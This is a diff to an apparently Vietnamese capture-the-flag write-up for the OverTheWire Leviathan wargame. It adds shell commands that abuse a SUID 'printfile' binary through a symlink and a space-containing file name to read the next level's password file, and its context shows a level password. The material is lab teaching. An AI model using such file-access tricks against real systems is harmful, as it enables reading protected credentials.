@@ -16,7 +16,14 @@ Password: NsN1HwFoyN
 ## 🔎 Cách thực hiện:   
 **Payload:**   
 ```bash
-
+ls
+./printfile /etc/leviathan_pass/leviathan3
+mkdir /tmp/lv2
+cd /tmp/lv2
+ltrace ~/printfile /etc/leviathan_pass/leviathan2
+ln -s /etc/leviathan_pass/leviathan3 tus
+touch "tus hehe"
+~/printfile "tus hehe"
 ```
 
 -Ta có 1 execute file SUID ```printfile```:    
